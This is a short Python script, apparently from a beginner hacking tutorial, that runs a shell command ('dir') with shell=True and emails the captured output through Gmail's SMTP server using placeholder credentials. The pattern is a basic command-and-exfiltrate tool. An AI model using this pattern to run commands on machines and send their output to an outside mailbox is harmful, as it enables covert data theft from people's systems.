import subprocess
import smtplib

def send_mail(semail,remail, message): 
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("<enter you mail_id>", "<Password>")
    s.sendmail(semail, remail, message)
    s.quit()
Command = "dir"
result = subprocess.check_output(Command, shell=True)
send_mail("sender_mail_id", "receiver_mail_id", result)
